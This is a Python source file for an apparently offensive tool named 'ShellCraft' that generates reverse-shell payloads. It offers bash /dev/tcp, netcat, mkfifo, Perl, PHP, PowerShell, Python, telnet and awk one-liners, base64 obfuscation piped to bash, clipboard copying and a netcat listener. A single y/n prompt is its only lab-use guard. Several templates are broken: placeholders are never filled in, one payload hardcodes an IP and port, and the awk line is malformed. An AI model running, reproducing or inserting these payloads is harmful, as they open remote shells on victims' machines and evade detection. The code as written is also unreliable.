import pyfiglet
from termcolor import colored
import pyperclip
import base64
import sys
import subprocess
import os
import signal
import socket
import ipaddress
import atexit
from datetime import datetime

# -------------------- Banner --------------------

def banner():
    print(colored(pyfiglet.figlet_format("ShellCraft", font="standard"), "cyan"))
    print(colored("[+] Author: SANDEEP PRASAD CHOWDHURY", "yellow"))
    print(colored("[+] Github: https://github.com/chowdhurysandeep\n", "yellow"))

# -------------------- Logging --------------------

def log_event(event):
    with open("shellcraft.log", "a") as f:
        f.write(f"[{datetime.now()}] {event}\n")

# -------------------- Guards --------------------

def lab_guard():
    confirm = input(colored("Authorized lab use only. Continue? (y/n): ", "red"))
    if confirm.lower() != "y":
        sys.exit(0)

def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_port_free(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("0.0.0.0", port)) != 0

# -------------------- Payloads --------------------

def awk_payload(ip, port):
    return ('awk "BEGIN{{cmd=| getline c; while(c){{c = (c|getline c); print c}}; close(cmd)}}" "/inet/tcp/{port}/{ip}/0/0"') #done

def bash_payload(ip, port):
    return ("""bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1""")

def bash_udp_payload(ip, port):
    return ("sh -i >& /dev/udp/{ip}/{port} 0>&1")

def ncat_payload(ip, port):
    return ("ncat {ip} {port} -e /bin/sh")

def nc_busybox_payload(ip, port):
    return ("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")

def nc_openbsd_payload(ip, port):
    return ("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f")

def nc_payload(ip, port):
    return ("nc -e /bin/sh {ip} {port}")

def perl_payload(ip, port):
    return ("""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""")

def php_payload(ip, port):
    return ("""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'""")

def powershell_payload(ip, port):
    return ("""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""")

def python_payload(ip, port):
    return ("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'""")

def telnet_payload(ip, port):
    return ("TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF")

# -------------------- Obfuscation --------------------

def obfuscate(payload):
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded} | base64 --decode | bash"

# -------------------- Utilities --------------------

def copy_clipboard(payload):
    pyperclip.copy(payload)
    print(colored("[+] Payload copied to clipboard", "green"))

# -------------------- Listener --------------------

def start_listener(port):
    if not is_port_free(port):
        print(colored("[!] Port already in use.", "red"))
        return

    print(colored(f"[+] Starting listener on port {port} ...", "green"))
    print(colored("[!] Press CTRL+C to stop listener\n", "yellow"))
    log_event(f"Listener started on port {port}")

    try:
        listener = subprocess.Popen(
            ["nc", "-lvnp", str(port)],
            stdin=subprocess.DEVNULL,
            stdout=sys.stdout,
            stderr=sys.stderr,
            preexec_fn=os.setsid
        )
        listener.wait()

    except KeyboardInterrupt:
        print(colored("\n[!] Stopping listener...", "red"))
        os.killpg(os.getpgid(listener.pid), signal.SIGTERM)
        log_event("Listener stopped via CTRL+C")
        print(colored("[+] Listener closed cleanly", "green"))

# -------------------- Menu --------------------

def menu(ip, port):
    while True:
        print(colored("\n--- Select Payload (Alphabetical) ---", "cyan"))
        print("1. Awk")
        print("2. Bash TCP")
        print("3. Bash UDP")
        print("4. Ncat")
        print("5. Netcat BusyBox")
        print("6. Netcat OpenBSD")
        print("7. Netcat Traditional")
        print("8. Perl")
        print("9. PHP")
        print("10. PowerShell")
        print("11. Python")
        print("12. Telnet")
        print("13. Exit")

        choice = input(colored("Choice: ", "yellow"))

        if choice == "13":
            print(colored("Exiting...", "red"))
            sys.exit(0)

        obf = False
        if choice in {"1","2","3","4","5","6","7","8","9"}:
            obf = input(colored("Obfuscate payload? (y/n): ", "yellow")).lower() == "y"

        payload_map = {
            "1": awk_payload,
            "2": bash_payload,
            "3": bash_udp_payload,
            "4": ncat_payload,
            "5": nc_busybox_payload,
            "6": nc_openbsd_payload,
            "7": nc_payload,
            "8": perl_payload,
            "9": php_payload,
            "10": powershell_payload,
            "11": python_payload,
            "12": telnet_payload
        }

        if choice not in payload_map:
            print(colored("Invalid option!", "red"))
            continue

        payload = payload_map[choice](ip, port)

        if obf:
            payload = obfuscate(payload)

        print(colored("\n[+] Generated Payload:\n", "green"))
        print(colored(payload.replace("\x1b", ""), "white"))

        if input("\nCopy to clipboard? (y/n): ").lower() == "y":
            copy_clipboard(payload)

        if input(colored("Start listener now? (y/n): ", "yellow")).lower() == "y":
            start_listener(port)

# -------------------- Cleanup --------------------

def cleanup():
    log_event("Program exited")

atexit.register(cleanup)

# -------------------- MAIN --------------------

try:
    banner()
    lab_guard()

    ip = input(colored("Enter Listener's IP : ", "green"))
    if not validate_ip(ip):
        print(colored("Invalid IP address.", "red"))
        sys.exit(1)

    port = int(input(colored("Enter Listening Port : ", "green")))
    menu(ip, port)

except KeyboardInterrupt:
    print(colored("\n[!] Program exited safely", "red"))
    sys.exit(0)
